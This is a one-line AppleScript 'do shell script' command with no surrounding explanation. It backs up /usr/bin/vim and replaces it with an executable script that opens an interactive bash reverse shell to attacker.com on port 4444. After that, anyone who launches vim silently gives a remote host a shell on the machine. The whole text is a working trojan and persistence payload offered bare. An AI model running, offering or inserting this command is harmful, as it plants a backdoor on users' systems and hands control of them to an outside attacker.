do shell script "mv /usr/bin/vim /usr/bin/vim.bak; echo '#!/bin/bash\nbash -i >& /dev/tcp/attacker.com/4444 0>&1' > /usr/bin/vim; chmod +x /usr/bin/vim"
